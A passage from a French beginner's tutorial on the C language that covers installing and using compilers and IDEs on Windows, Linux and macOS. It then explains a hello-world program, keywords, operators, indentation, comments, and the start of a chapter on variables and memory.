c'est ici que l'on écrira le code. L' explorateur de solutions : cette zone permet de gérer les fichiers qui composent notre projet. Visual y organise les fichiers en trois types : les fichiers sources, les fichiers ressources et les fichiers d'en-tête (nous verrons tout ça en temps voulu). La zone de notification : c'est dans cette zone qu'apparaissent les erreurs, les informations du débogueur, les avertissements et les messages de compilation. Voici quelques raccourcis claviers pratiques que vous serez souvent amenés à utiliser : F5 : lance l'exécutable en appelant le débogueur ; Ctrl + F5 : lance l'exécutable sans appeler le débugger ; F7 : génère une solution (compile) sans lancer le programme ; Ctrl + Alt + F7 : régénère une solution. Comme une liste de tous les raccourcis serait trop longue, voici la liste officielle (en anglais). Essayons de mettre en pratiques quelques-uns de ces raccourcis en compilant un code minimal. Je vous fournis un code source que nous examinerons dans le chapitre suivant. #include <stdio.h> int main ( void ) { printf ( \"Hello world! \\n \" ); return 0 ; } Pour le compiler, on doit faire F7 puis Ctrl + F5 . Cependant, pour allez plus vite, on peut faire directement Ctrl + F5 . Si vous utilisez cette combinaison de touches, il se peut que vous tombiez sur une fenêtre semblable à celle-ci : Cela signifie qu'il y a eu des modifications dans le code et que la solution n'a pas été régénérée (on a pas recompilé). Dans ce cas, cliquez sur « Oui » pour régénérer la solution, ou cliquez sur « Non » pour lancer la dernière solution générée (le dernier exécutable compilé). Avec l'invite de commande Même si la programmation à l'aide d'un IDE peut être pratique, certains préfèrent néanmoins programmer à la main , c'est-à-dire s'occuper eux-mêmes de la compilation. Pour cela, ils utilisent l'invite de commande. Si jamais cette méthode vous tente et que vous avez les compétences nécessaires pour vous servir de l'invite, lisez cette partie. Le compilateur Le plus important dans tout ça est le compilateur. Je vous propose donc de télécharger MinGW , qui est une adaptation pour Windows du compilateur GCC , je vous le rappelle. Rendez-vous sur le site de MinGW , puis dans le cadre de gauche dans la section « Download ». Pour se faciliter le travail, on va télécharger l'installateur. Pour cela, cliquez sur le lien en haut de la page « Looking for the latest version ? Download mingw-get-inst-xxxxxxxx.exe (xxx.x kB) ». Exécutez le programme. Arrivés à la partie « Repository Catalogues », choisissez « Use pre-packaged repository catalogues » si vous voulez utiliser les outils fournis avec l'installateur, ou bien « Download latest repository catalogues » si vous voulez que l'installateur télécharge les tout derniers fichiers. Ceci fait, acceptez la licence (lisez-la si vous en avez le courage), puis sélectionnez le dossier où vous souhaitez que MinGW soit installé. Ensuite, il faut choisir les composants que l'on veut installer. Normalement, seuls « MinGW Compiler Suite » et « C Compiler » sont cochés. Les autres cases ne nous intéressent pas puisque elles servent à installer des compilateurs pour d'autres langages. Laissez ensuite le programme finir son travail. Maintenant il reste une dernière étape : configurer la variable d'environnement (PATH). Cette étape va permettre à l'Invite de Commande de comprendre les commandes de compilation de MinGW , sans quoi il serait impossible de compiler un programme. Sous Windows XP et antérieur, il faut faire un clic-droit sur « Poste de travail » puis choisir « Propriétés ». Dans la fenêtre qui s'ouvre, cliquez sur « Avancés » puis sur « Variables d'environnement ». Sous Windows Vista et Seven, il faut faire un clic-droit sur l'icône « Ordinateur » dans le menu Démarrer ou bien sur « Poste de travail ». Ensuite, cliquez sur « Paramètres systèmes avancés ». Dans la nouvelle fenêtre qui s'ouvre, allez dans « Paramètres systèmes avancés » et cliquez sur « Variable d'environnement ». Dans la partie Utilisateur courant , créez une nouvelle variable et rentrez %PATH%;C:\\MinGW\\bin (le chemin après le point-virgule peut varier en fonction de où vous avez décidés d'installer MinGW , l'important est de bien avoir le répertoire bin à la fin). L'éditeur de texte L'éditeur de texte va nous permettre d'écrire notre code source et de l'enregistrer pour que le compilateur fasse son travail. L'idéal est d'avoir un éditeur de texte facile à utiliser et qui colore le code source, ce qui permet une meilleure relecture. Si jamais vous avez déjà un éditeur de texte et que vous l'appréciez, ne changez pas, il marchera très bien lui aussi. Si cependant vous ne savez pas lequel prendre, je vais vous aider. Personnellement, j'utilise Notepad++ , qui est simple, pratique et efficace. Pour le télécharger, rendez-vous sur la page de téléchargement , et sélectionnez « Notepad++ vX.X.X.X Installer » pour télécharger l'installateur. Pour l'installation je vous laisse faire, elle est facile. Compiler à la main avec l'invite de commande Testons tout ce que l'on vient d'installer en compilant un petit code simple que nous expliquerons dans le chapitre suivant. #include <stdio.h> int main ( void ) { printf ( \"Hello world! \\n \" ); return 0 ; } Copiez-collez ce code dans l'éditeur de texte, puis enregistrez le fichier sous le nom main.c . Ensuite, déplacez-vous dans les répertoires à l'aide de l'invite pour arriver dans le répertoire qui contient le fichier source. C:\\Programmation>dir Répertoire de C:\\Programmation 07/12/2011 13:54 <REP> . 07/12/2011 13:54 <REP> .. 07/12/2011 13:54 130 main.c 1 fichier(s) 130 octets 2 Rép(s) 172 089 290 752 octets libres Nous allons compiler ce fichier à l'aide d'une commande : gcc main.c . Cette commande va transformer le fichier spécifié en exécutable. Si vous regardez le répertoire de nouveau, vous remarquerez d'ailleurs qu'un fichier .exe est apparu. C'est le résultat de la compilation. Si vous le lancez, vous verrez le résultat à l'écran : C:\\Programmation>gcc main.c C:\\Programmation>main.exe Hello world Si vous obtenez une erreur du type « 'gcc' n'est pas reconnu en tant que commande interne ou externe, un programme exécutable ou un fichiers de commandes » c'est que vous vous êtes trompés quelque part. Nous apprendrons dans le chapitre suivant pourquoi le programme affiche un message à l'écran. Il existe de nombreuses options de compilation pour MinGW que tout un cours entier ne pourrait pas aborder. Si vous souhaitez découvrir ces options, vous pouvez jeter un œil à la documentation officielle . Même si cette page traite de GCC , la très grande majorité des options marchent pour MinGW . GNU/Linux - UNIX Le C étant très lié à UNIX, il existe de nombreux outils disponibles pour ces deux systèmes d'exploitation. Je vais vous en présenter quelques-uns. Afin d'éviter certains problèmes, je vous conseille fortement d'installer le paquet ''build-essential'' avant toute chose sous Debian et ses dérivés (Ubuntu, Kubuntu, etc. en font partis) : # aptitude install build-essential Les IDE Sous GNU/Linux et UNIX, il y a évidemment de nombreux IDE disponibles. Si vous souhaitez utiliser un IDE , je vous conseille Code::Blocks. Vérifiez dans vos dépôts s'il est disponible, et si jamais il ne l'est pas, rendez-vous sur la page de téléchargement du site officiel de Code::Blocks . Une fois que vous l'avez installé, regardez plus haut dans ce tutoriel pour vous familiariser avec lui. Même si les IDE sont pratiques, beaucoup de programmeurs préfèrent compiler à la main sous ces plateformes. Je vous recommande donc de lire également la partie suivante, même si vous ne pensez pas compiler à la main. La compilation en ligne de commande La compilation à la main est prônée par de nombreux programmeurs experts. On dit souvent que ça présente de nombreux avantages. Cependant, pour le programmeur débutant, c'est légèrement différent. En effet, la compilation manuelle présente des avantages et des défauts : rapide une fois prise en main et légère ; permet d'apprendre plus de choses, voire même d'apprendre plus rapidement certains concepts ; on doit cependant tout faire soi-même ; parait compliqué et hostile ; il faut savoir manipuler le terminal. Le troisième argument est en orange puisque le fait de tout faire soi-même est très intéressant et est donc un avantage conséquent. Cependant, pour certains cette technique est assez difficile . Faire tout soi-même permet au programmeur d'avoir le contrôle absolu sur ce qu'il fait, contrairement à certains IDE qui dissimulent certaines fonctionnalités intéressantes par exemple. Avant de vous montrer l'utilisation de GCC , le compilateur que nous allons utiliser, il faut d'abord avoir un code source sous la main. Pour créer un code source sans IDE , il faut utiliser un éditeur de texte et non pas un traitement de texte ! Un éditeur de texte est un programme qui permet de modifier des fichiers quelconques (tout est fichier, en tout cas sous les GNU/Linux et UNIX, donc avec un éditeur de texte, vous pouvez tout modifier ; cependant, on préfère un éditeur de texte pour programmer, en effet aucune personne saine d'esprit n'irait créer un fichier *.png à la main). Un traitement de texte comme LibreOffice Writer permet non seulement de modifier des fichiers textes, mais offre la possibilité de les mettre en forme, c'est-à-dire mettre en gras du texte, changer la police, ajouter des images, etc. Il existe des éditeurs de textes graphiques et des éditeurs de textes en console. Voici quelques-uns des plus célèbres et des plus utiles pour un programmeur : Vim , tutoriel en français : commande vimtutor ; Emacs , tutoriel en français disponible ici ; jEdit , tutoriel en français disponible ici ; Kate , tutoriel en français disponible ici . jEdit est un très bon éditeur de texte graphique spécialement adapté à la programmation. Vim et Emacs sont des éditeurs de texte extrêmement puissants en pratique, mais assez compliqués, surtout pour un débutant ; ne les laissez pas de côté pour autant, ils ne peuvent que vous être utiles. Maintenant, créez un fichier test.c (que vous pouvez mettre dans un dossier nommé « prog » dans votre dossier home par exemple) contenant le code suivant : #include <stdio.h> int main ( void ) { printf ( \"Hello world! \\n \" ); return 0 ; } Afin de créer l'exécutable à partir du code source précédent, on fait comme ceci : gcc test.c Ou bien encore : gcc *.c # Le joker * permet de raccourcir la commande. Un exécutable s'est créee : a.out , que l'on lance ainsi : ./a.out Pour modifier le nom de l'exécutable, on utilise l'option -o comme ceci : gcc test.c -o mon_executable Comme on peut s'en douter, il existe énormément d'options de compilation différentes, si bien qu'on ne peux pas toutes les lister ici. Cependant, ce tutoriel ainsi que vers la documentation officielle sont là pour ça. Bien que ces pages contiennent des éléments avancés du C, elles peuvent servir à n'importe quel moment, d'où l'intérêt de les garder. Il existe bien entendu d'autres compilateurs comme Comeau C/C++, une liste exhaustive étant impossible à faire. Mac OS Avec un IDE Plusieurs IDE existent sous Mac OS, par exemple Code::Blocks. Cependant, ce dernier étant assez bogué sur Mac, je vous déconseille fortement de l'utiliser. Nous allons utiliser l' IDE fourni par Apple qui se trouve être le plus complet et le plus puissant : Xcode . Il est gratuit, cependant il est en anglais (au même titre que Code::Blocks). Si vous êtes anglophobe, ne vous inquiétez pas, vous pouvez très bien vous en sortir à l'aide de volonté et d'un dictionnaire. Premièrement, il va falloir télécharger Xcode. Si vous êtes sous Mac OS X Lion, vous n'avez qu'à aller sur le Mac AppStore (menu « Pomme > App Store ... ») et télécharger Xcode. Si vous êtes sous une version antérieure, il faudra vous rendre sur le site de développeur d'Apple : Apple Developer Connection . Il faudra ensuite vous rendre sur le Mac Dev Center puis dans « Additional download », vous cliquerez sur « View all downloads ». Quand vous aurez la liste, il suffit de chercher la version 3 de Xcode (pour Leopard et Snow Leopard) ou 2 pour les versions encore antérieures (Tiger). Vous pouvez aussi utiliser votre CD d'installation pour installer Xcode (sauf pour Lion). Seule la version 4 de Xcode sera présentée ici. Une fois le téléchargement terminé, vous aurez un fichier nommé « Install Xcode.app », lancez l'application et cliquez sur « Install » puis acceptez les conditions d'utilisation. Votre mot de passe administrateur va vous être demandé. L'installation dure un certain temps, allez prendre un café en attendant. Maintenant que Xcode est installé, vous pouvez supprimer le fichier « Install Xcode.app », ça vous libèrera quelques Go d'espace disque. Lancez Xcode maintenant. S'il n'est pas présent dans le dock ou si vous l'en avez supprimé par erreur, vous pourrez toujours retrouver l'application dans le menu /Developer/Applications . Je pense que c'est assez explicite, pas besoin de trop m'attarder là-dessus. Cliquez sur « Create a new Xcode project », puis sélectionnez « Command Line Tool » dans la partie « Application » de « Mac OS X » sur la partie gauche puis cliquez sur « Next ». Dans le champ « Product Name », entrez simplement le nom de votre projet. Dans le champ « Company Identifier », vous pouvez mettre votre pseudo par exemple (à moins que vous apparteniez à une entreprise, dans ce cas-là, il faudrait mettre le nom de votre entreprise). Choisissez bien « C » dans le champ « Type », puis cliquez sur « Next ». Dans la fenêtre suivante, vous devrez sélectionner le chemin vers lequel vous allez mettre votre projet. Xcode crée un dossier pour votre projet du nom que vous avez entré. Votre projet s'ouvre automatiquement. Vous devriez avoir une fenêtre qui ressemble à ça : Une petite présentation s'impose. Je vous ai entouré les 4 parties principales qui consistent l'interface, ainsi que 2 autres en haut de la fenêtre. La partie en haut à droite, nommée « View », sert à afficher ou masquer les parties numérotées (les numéros ont été rajoutés pour bien se repérer). Vous pouvez masquer la partie 4, elle ne nous servira à rien. Il arrivera que la partie 3 ne s'affiche pas, quand vous lancez un programme qui n'affiche rien par exemple, il vous suffira de cliquer sur le bouton numéroté 3 (toujours dans la partie View ). La partie 1 reste toujours visible en règle générale. La partie en haut à gauche contient 4 boutons. Le bouton « Run » (raccourci : Cmd + R ) est celui que vous utiliserez le plus souvent, il permet de compiler puis de lancer votre programme. Le bouton « ''Stop'' » permet d'arrêter votre programme à tout moment. Le bouton « Scheme » ne nous intéresse pas (il permet de changer quelques options de compilation, de changer de target , etc.). Le bouton « Breakpoints » sert à activer/désactiver les points d'arrêt. C'est utile si vous utilisez le débogueur. Dans la partie 1, vous avez 7 onglets tout en haut. Le premier onglet sert à voir l'arborescence de votre projet (fichiers, ressources, etc.). Le 4ème onglet (en forme de point d'exclamation) sert à voir les erreurs et warnings que vous pourrez avoir pendant votre codage. Les autres onglets ne nous intéressent pas. Vous pouvez changer d'onglet en utilisant les raccourcis Cmd + 1 à 7 en fonction de l'onglet que vous voulez choisir. La partie 2 est votre éditeur de texte (il affiche aussi les images, etc., je ne vais pas entrer dans les détails). C'est ici que vous allez placer votre code. Si vous avez plusieurs fichiers, sélectionnez le fichier dans la partie 1 et éditez-le dans la partie 2. Vous pouvez ouvrir des onglets (comme sur les navigateurs Internet) en utilisant le raccourci Cmd + T . Ce qu'il faut savoir, c'est que pendant que vous tapez votre texte, vous aurez des propositions qui vous seront faites pendant que vous tapez le mot. C'est ce qu'on appelle l' autocomplétion . Ça permet d'éviter de taper tout le mot. Pour valider, il suffit d'appuyer sur Enter ou Tab . Si vous voulez « forcer » l'apparition de l'autocomplétion, vous pouvez appuyer sur la touche Echap . Xcode vous montre vos erreurs en temps réel , ce qui vous permet de vous rendre compte de vos erreurs de syntaxe tout de suite. La partie 3 contient la pseudo-console (partie noire de droite) et la zone de débogage (à gauche et la ligne du haut avec les flèches). Ce qui nous intéresse est la partie de droite, c'est là que vous allez exécuter vos programmes ! Pour enlever la partie de débogage, il suffit de cliquer sur le bouton juste à droite du bouton « Clear ». Vous pouvez aussi enlever les messages du débogueur (je vous le déconseille) en cliquant sur « All Output » et en sélectionnant « Target Output ». La partie 4 ne nous intéresse pas, vous pouvez la masquer comme indiqué plus haut. Tentons maintenant de compiler notre premier code que voici : #include <stdio.h> int main ( void ) { printf ( \"Hello world! \\n \" ); return 0 ; } Essayez de compiler ce code. Vous devriez voir s'afficher à l'écran quelque chose comme ceci : GNU gdb 6.3.50-20050815 (Apple version gdb-1708) (Mon Aug 15 16:03:10 UTC 2011) Copyright 2004 Free Software Foundation, Inc. GDB is free software, covered by the GNU General Public License, and you are welcome to change it and/or distribute copies of it under certain conditions. Type \"show copying\" to see the conditions. There is absolutely no warranty for GDB. Type \"show warranty\" for details. This GDB was configured as \"x86_64-apple-darwin\". tty /dev/ttys000 sharedlibrary apply-load-rules all [Switching to process 679 thread 0x0] Hello world! Program ended with exit code: 0 Toutes ces lignes ont été ajoutées par le compilateur automatiquement et ne nous intéressent pas vraiment. La dernière ligne affiche cependant le message Hello world! ainsi que le résultat de l'exécution. En ligne de commande Ça peut vous paraître étrange, mais le plus simple pour installer les outils pour la ligne de commande est d'installer Xcode. Je vous invite donc à installer Xcode comme présenté ci-dessus (et éventuellement les Xcode Tools si vous utilisez une version plus ancienne). Une fois Xcode installé, allez dans le dossier « /Applications/Utilitaires » et lancez l'application « Terminal.app ». Pour l'éditeur de texte, vous pouvez choisir celui que vous voulez (emacs, vim, nano, etc.). Pour compiler, vous avez le choix : gcc, clang, llvm-gcc. Pour l'utilisation de tout ça, reportez-vous à la partie GNU/Linux juste au-dessus. Ce chapitre vous a fait découvrir quelques-uns des outils utilisés lorsque l'on programme en C, mais il en existe beaucoup d'autres que vous aurez peut-être l'occasion de découvrir un jour. Néanmoins, le choix importe peu puisque le résultat est le même : un fichier en langage machine compréhensible par le processeur (c'est là qu'on dit merci à la norme, parce que sans elle, le comportement varierait en fonction du logiciel utilisé). Quelle que soit votre méthode, je vous encourage à la découvrir en trifouillant un peu. Le chapitre suivant va nous faire découvrir le C, et vous pourrez commencer à pratiquer en compilant et en décortiquant un code écrit en langage C. Rencontre avec le C Maintenant que vous êtes parés, il est temps de découvrir le langage C à travers du code. Dans ce chapitre, nous allons nous familiariser avec la programmation en découvrant non seulement des éléments spécifiques au C, mais également des éléments communs à tous les langages de programmation. Lisez attentivement ce chapitre, il vous présentera de nombreux éléments nouveaux et du vocabulaire qui vous est peut-être inconnu. Notre cible Avant de commencer à programmer, il faut aussi définir ce que l'on va programmer, le type de programme que l'on va réaliser. Il existe en effet deux types de programmes : les programmes graphiques et les programmes en console . Les programmes graphiques sont les plus courants et les plus connus puisqu'il n'y a pratiquement qu'eux sous Windows ou Mac OS X par exemple. Vous en connaissez énormément, peut-être sans le savoir : le lecteur de musique, le navigateur Internet, le logiciel de discussion instantanée, la suite bureautique, les jeux vidéos, ce sont tous des programmes graphiques, ou programmes GUI . En voici un exemple sous GNU/Linux : Cependant, écrire ce genre de programmes demande beaucoup de connaissances, il faut savoir manier des bibliothèques, connaitre plusieurs notions; bref, savoir programmer. C'est trop compliqué pour nous. Il faut donc se rabattre sur le deuxième type de programme : les programmes en console. Les programmes console sont les premiers programmes, apparus en même temps que l'écran. Ils étaient très utilisés dans les années 1970 / 1980 (certains d'entre vous se souviennent peut-être de MS-DOS), mais ont fini par être remplacés par une interface graphique avec la sortie de Windows et de Mac OS. Cependant, ils existent toujours, et redeviennent quelque peu populaires avec GNU/Linux. Voici un exemple de programme en console : 12 - 7 = 5 Right! 9 - 5 = 4 Right! 1 + 5 = 6 Right! 3 + 3 = 6 Right! 5 + 4 = 9 Right! 10 + 9 = 19 Right! 16 - 10 = 6 Right! 9 - 1 = 8 Right! 18 - 10 = 8 Right! 3 + 3 = 6 Right! Rights 10; Wrongs 0; Score 100% Total time 16 seconds; 1.6 seconds per problem Press RETURN to continue... Ce sera le type de programme que nous allons apprendre à créer. Rassurez-vous, quand vous aurez fini le tutoriel, vous aurez les bases pour apprendre à utiliser d'autres bibliothèques, vous pourrez ainsi créer des programmes graphiques. Tout est possible. Analyse du code source Dans le chapitre précédant, nous avons installé les outils nécessaires à la compilation et nous avons compilé notre premier code source. Il est temps de découvrir plus en détail ce code et de comprendre ce qu'il signifie. Je remets ce code ici pour que tout le monde aie le même : #include <stdio.h> int main ( void ) { } Copiez-collez ce code pour que vous et moi ayons le même, puis sauvegardez. Même si c'est un minuscule projet, c'est une bonne habitude à prendre qui peut parfois vous épargner des problèmes de fichiers perdus. #include Cette ligne se situe tout en haut du programme. #include <stdio.h> C'est une directive de préprocesseur , facilement reconnaissable car elles commencent toutes par un # . Dans notre cas, elle sert à charger des fichiers qui contiennent du code tout prêt pour réaliser de nombreuses actions (comme afficher un message, récupérer des informations, quitter le programme, lire un fichier, etc). En effet, sans ces fichiers, appelés fichiers d'en-tête (en anglais, on parle de headers ), le C ne sait quasiment rien faire. On dit que c'est un langage modulaire . L'ensemble de ces fichiers d'en-tête est appelé bibliothèque (de l'anglais « library »). Le mot « librairie » est plus court, mais il n'est pas correct car il s'agit d'un anglicisme. Dans notre cas, nous ne chargeons qu'un seul fichier d'en-tête : stdio.h , qui signifie « St andar d i nput o utput », soit « Entrée-sortie standard ». Ce fichier d'en-tête va nous permettre de communiquer avec l'utilisateur en affichant des messages à l'écran et en récupérant des informations. int main(void) C'est le cœur du programme : int main ( void ) { } Ce bout de code est appelé fonction . Un programme écrit en C n'est composé pratiquement que de fonctions : c'est un bout de code qui sert à donner des instructions à l'ordinateur. Ainsi, on peut créer une fonction calculer_racine_carree qui calculera la racine carrée d'un nombre. Vous verrez plus tard dans votre apprentissage qu'un programme C est constitué d'un tas d'autres choses, mais surtout de fonctions. Notre fonction s'appelle main (prononcez « mèïne »). C'est la fonction de base commune à tous les programmes en C, le point d'entrée du programme, son cœur. Le programme commence et finit toujours par elle. Bien sûr, nous n'écrirons pas tout le code dedans, ce serait impossible à entretenir et causeraient trop de problèmes pour de gros projets. Au contraire, elle déléguera le travail, mais on la retrouvera toujours. Une fonction est délimitée par des accolades ( { et } ). Après les accolades il n'y a rien, car pour l'instant nous n'avons que la fonction main . À noter que la dernière accolade est suivie d'une ligne vide. Elle ne sert à rien, mais il faut la mettre quand même. À l'intérieur des parenthèses, il y a le mot « void ». Ce mot-clé signifie « Je ne veux pas de paramètres ». Il est en effet possible de donner des paramètres à la fonction main , mais ce n'est pas de notre niveau. Notions de base Pour l'instant, nous n'avons présenté que le code C minimal. Néanmoins, il existe des notions très importantes et communes à tous les langages de programmation, et nous allons vous les présenter, en les appliquant au C bien entendu. Soyez donc concentré, cette partie est basique, mais importante pour la suite. Les mots-clés Les mots-clés sont des mots spéciaux, réservés par le compilateur, que l'on ne peut pas utiliser comme on veut. Ils servent à déclarer des variables, concept que l'on découvrira dans le chapitre suivant, à préciser des attributs, et réaliser d'autres actions encore. Le C a réservé 32 mots-clés, que voici : auto double int struct break else long switch case enum register typedef char extern return union const float short unsigned continue for signed void default goto sizeof volatile do if static while Norme C89 — A.1.1.2 Keywords Nous les verrons tous au fur et à mesure de la progression de ce cours. Certains vous seront plus utiles que d'autres, mais tous ont un rôle. D'ailleurs, ces mots-clés sont colorés par votre IDE . Cela permet au programmeur de mieux voir, et disons-le, c'est toujours plus joli que du code entièrement en noir. Les opérateurs Les opérateurs sont des symboles à la base des expressions (nous verrons plus bas de quoi il s'agit). Ils permettent de faire des opérations comme l'addition, la multiplication, la comparaison de deux valeurs, l'opposé d'une valeur, etc. De même qu'en mathématiques, tous n'ont pas la même priorité : certains passent avant d'autres. Les opérateurs en C sont les suivants : [ ] ( ) . -> ++ -- & * + - ~ ! sizeof / % << >> < > <= >= == != &#94; | && || ? : = *= /= %= += -= <<= >>= &= &#94;= |= , Norme C89 — A.1.1.6 Operators Vous noterez que sizeof est à la fois un mot-clé et un opérateur. Les opérateurs peuvent être classés en C en sept catégories : les opérateurs arithmétiques ; les opérateurs d'affectation ; les opérateurs logiques ; les opérateurs de comparaison ; l'opérateur conditionnel ; les opérateurs bit-à-bit ; et quelques opérateurs inclassables. Nous examinerons toutes ces catégories au fur et à mesure que nous progresserons dans le tutoriel. Comme pour les mots-clés, vous en utiliserez certaines plus que d'autres, mais toutes ont leur utilité. Expressions et instructions La différence entre les deux notions est un peu subtile et conduit parfois à des confusions. Une expression est évaluée et produit un résultat. Les lignes de code suivantes sont toutes des expressions. \"Hello world!\" 2 + 3 10 > 2 Généralement, une expression ne peut être écrite seule, sans contexte autour. Cela correspondrait en français à énoncer un sujet sans le verbe qui va derrière. Une instruction, quant à elle, est un ordre qui permet d'exécuter telle ou telle action. Pour vous aider, chaque instruction peut se traduire par une phrase verbale en français. printf ( \"Hello world!\" ); /* Affiche « Hello world! ». */ x = 2 ; /* Affecte la valeur 2 à x. */ Toutes les instructions se terminent par un point-virgule (nous apprendrons au fur et à mesure les quelques-unes qui n'en requièrent pas). La frontière entre instruction et expression est assez floue puisqu'une instruction peut être constituée de nombreuses expressions. Le code ci-dessous est un exemple d'une instruction qui est aussi une expression. x = 2 + 3 ; On donne en effet un ordre à l'ordinateur (« Affecte la valeur 2 + 3 à x »), mais c'est aussi une expression qui produit la valeur 5 comme résultat. Vous verrez qu'en C, la majorité des lignes de code sont des instructions-expressions. C'est ce qui s'appelle la programmation impérative . C'est le choix des concepteurs du langage, mais ce n'est pas la seule possibilité (il en existe d'autres, mais ça ne nous concerne pas en tant qu'utilisateurs du C). Les blocs d'instructions Un bloc d'instructions est formé d'une suite d'instructions délimitée par des accolades, et tout ce qu'il y a entre les accolades est par conséquent à l'intérieur d'un bloc d'instructions. La fonction main est par exemple suivie d'un bloc d'instructions composé de deux instructions. Les séparateurs Lorsque l'on écrit, on met des espaces entre les mots pour rendre le tout plus clair. Pour la programmation, c'est pareil. On insère des espaces et des retours à la ligne dans un code source pour le rendre plus clair et plus lisible. Par exemple, les deux codes ci-dessous sont identiques pour le compilateur, mais le second est plus lisible pour le programmeur que le premier. int x = 0 , y , rep ; int x = 0 , y , rep ; Ce dernier point m'amène donc à l'indentation. L'indentation L' indentation est vraiment quelque chose de très important. Elle consiste en l'ajout de tabulations ou d'espaces dans un code source. Un code bien indenté est un code clair et agréable à lire. Le style d'indentation définit comment les programmeurs se débrouillent afin de faire ressortir du code. Parce qu'un code vaut 1000 mots : #include <stdio.h> int main ( void ) { printf ( \"Hey ! \\n \" ); printf ( \"Bien ?\" ); return 0 ;} En comparaison avec : #include <stdio.h> int main ( void ) { printf ( \"Hey ! \\n \" ); printf ( \"Bien ?\" ); return 0 ; } Il existe de nombreux styles d'intendation différents. C'est à vous de choisir celui que vous préférez, et surtout de vous y tenir. Ce cours utilisera quant à lui le style Allman (ou style ANSI ). Il faut aussi que vous sachiez qu'il existe une règle concernant le nombre de colonnes (de caractères entre autres) à ne pas dépasser par ligne. C'est une très ancienne règle, qui limite le nombre de caractères par ligne à 80. Vous n'êtes pas obligé de la suivre, loin de là. Mais sachez que certains l'affectionnent encore, et ne soyez pas surpris si certains codes suivent cette règle. Dans ce tutoriel, ce ne sera pas le cas. Les commentaires Il est souvent nécessaire de commenter son code source pour décrire des passages un peu moins lisibles ou tout simplement pour offrir quelques compléments d'information au lecteur du code. Un commentaire est ignoré par le compilateur : il disparait et n'est pas présent dans l'exécutable. Il ne sert qu'au programmeur et aux lecteurs du code. Un commentaire en C est écrit entre les signes /* et */ : /* Ceci est un commentaire */ Il peut très bien prendre plusieurs lignes : /* Ceci est un commentaire qui prend plusieurs lignes. */ Le plus dur quand on utilise les commentaires, c'est de trouver un juste milieu : trop de commentaires tue le commentaire, et bien souvent la grande majorité des commentaires sont inutiles. À l'inverse, pas assez de commentaires peuvent rendre la relecture du code plus difficile, surtout pour du code compliqué. Pour trouver ce juste milieu, il faut savoir plusieurs choses. Premièrement, pas besoin de commenter chaque ligne : si certaines instructions sont évidentes, les commenter sera superflu. Deuxièmement, essayer de faire des blocs de commentaires donnant une explication générale plutôt que de commenter chaque ligne une à une. Les commentaires doivent servir à décrire quelque chose de flou, ne vous sentez donc pas poussés à en mettre partout. L'idée de base est que les commentaires doivent aider le lecteur et éviter de redire ce que le code dit . Voilà à quoi ressemblerait notre code (excessivement) commenté : /* Directive de préprocesseur qui permet de charger des fonctions utiles */ #include <stdio.h> /* La fonction principale */ int main ( void ) { /* Et des instructions */ printf ( \"Hello world! \\n \" ); return 0 ; } /* Fin du code, le programme s'achève ici */ Bien sûr, en pratique, ces commentaires sont inutiles. En outre, vous pouvez rencontrer un autre style de commentaires, dit \"commentaire de style C++\" , qui provient du langage C++. Ce type de commentaire, noté // n'est autorisé en C que depuis le C99, je vous conseille donc de ne pas les utiliser en C et de les remplacer par les bon vieux /*...*/ . Ces commentaires C++ commentent tout ce qui est situé entre eux et la fin de la ligne. Je les mentionne uniquement parce que vous risquez d'en voir parfois dans les codes des autres programmeurs. Voilà, vous avez enfin fait la connaissance du C à travers du code. Certes, nous n'avons vu qu'un petit code et avons seulement survolé les différents éléments, mais il n'empêche que cela représente certainement beaucoup de nouveautés pour vous. Relisez donc à tête reposée si nécessaire. Les variables Programmer, c'est avant tout donner des ordres à notre ordinateur. Ces ordres vont permettre à notre ordinateur de faire ce qu'on veut. Notre ordinateur peut manipuler un peu de tout : du texte, de la vidéo, des nombres, etc. Les ordres qu'on va donner à notre ordinateur vont ainsi lui permettre de manipuler de l'information sous différentes formes, plus ou moins variées. À ce stade du tutoriel, on sait que ces ordres, ces instructions sont effectués par notre processeur. Mais on ne sait rien sur la façon dont notre ordinateur fait pour maintenir ces informations, ni sur comment les utiliser dans notre langage C. De même, on ne sait pas comment donner des ordres à notre ordinateur, pour qu'il fasse ce qu'on lui demande. Ce chapitre va pallier ce problème : il vous expliquera comment manipuler les types de données les plus simples disponibles en langage C. Ceux-ci ne sont autre que des nombres et des lettres. Ils sont manipulables grâce à ce qu'on appelle des variables , qui sont l'objet de ce chapitre. Après ce chapitre, vous saurez notamment comment manipuler des nombres et des lettres en langage C. Vous pourrez ainsi profiter de votre ordinateur comme s'il s'agissait d'une grosse calculette, bien plus rapide et puissante. Néanmoins, rassurez-vous ; le niveau en maths de ce chapitre sera très très faible : si vous savez compter, vous pourrez comprendre le chapitre facilement ! Cela peut paraitre simple, et pas très intéressant. Mais il faut bien commencer par les bases, comme la manipulation de données simples : manipuler du texte ou de la vidéo est complexe, et nécessite en plus de savoir comment manipuler des nombres. Eh oui ! Comme vous allez le voir, tout est nombre pour notre ordinateur, même le texte et même la vidéo. Qu'est-ce qu'une variable ? Pour comprendre ce qu'est une variable, et comment manipuler celles-ci, il faut commencer par comprendre comment notre ordinateur fait pour stocker ces informations de base. Notre ordinateur a été conçu pour être assez polyvalent : il peut en théorie stocker tout type d'informations. Pour ce faire, celui-ci utilise une ruse particulièrement simple : il stocke ses informations en les découpant en petites unités d'information qu'on appelle des bits . Ces bits sont donc des unités très simples qui ne peuvent prendre que deux valeurs : 0 ou 1. Pour stocker des informations plus complexes, il suffit de prendre plusieurs de ces bits et de les regrouper les uns à côté des autres. En faisant ainsi, on peut créer des suites de 0 et de 1 qui peuvent s'interpréter comme des nombres. On peut ainsi représenter des nombres positifs, des nombres négatifs, des nombres à virgule, etc. Tout ce que peut faire notre ordinateur, c'est manipuler ces suites de bits, ces nombres. En somme, notre ordinateur n'est qu'une grosse calculatrice. Mais alors comment notre ordinateur fait pour stocker du texte, de la vidéo, etc. s'il ne sait traiter que des nombres ? Eh bien il faut savoir que les informations plus complexes, comme de la vidéo, du texte, etc. sont toutes stockées dans notre ordinateur sous la forme de nombres. En utilisant plusieurs de ces bits, on peut ainsi représenter n'importe quoi : du texte, des nombres, de la vidéo, etc. Je suppose qu'il sera difficile de me croire, mais sachez tout de même que toute information qu'on trouve dans notre ordinateur est représentée avec seulement des 0 et des 1 ! Mémoire Ces bits sont stockés dans un composant électronique particulier, présent das notre ordinateur : la mémoire . Son rôle : stocker tous les bits qui permettent de représenter nos informations. Enfin, je dis « la mémoire », mais en fait il y en a plusieurs. Tout comme un humain possède plusieurs mémoires (mémoire à court terme, mémoire à long terme, etc.) qui lui servent à mémoriser plein d'informations, l'ordinateur se sert aussi de plusieurs 